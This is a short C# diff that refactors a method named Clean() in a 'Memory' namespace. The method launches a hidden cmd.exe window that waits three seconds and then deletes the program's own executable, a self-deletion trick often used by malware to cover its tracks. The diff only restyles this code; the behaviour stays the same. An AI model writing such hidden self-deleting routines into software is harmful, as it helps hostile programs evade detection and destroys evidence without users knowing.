@@ -48,18 +48,16 @@ namespace Memory
         public static void Clean()
         {
             Process process = Process.GetCurrentProcess();
-            if (process.MainModule != null)
-            {
-                string exe = process.MainModule.FileName;
+            if (process.MainModule == null) return;
 
-                Process.Start(new ProcessStartInfo()
-                {
-                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exe + "\"",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
-                    FileName = "cmd.exe"
-                });
-            }
+            string exe = process.MainModule.FileName;
+            Process.Start(new ProcessStartInfo()
+            {
+                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + exe + "\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe"
+            });
         }
 
         public static string RandomStr(int length)
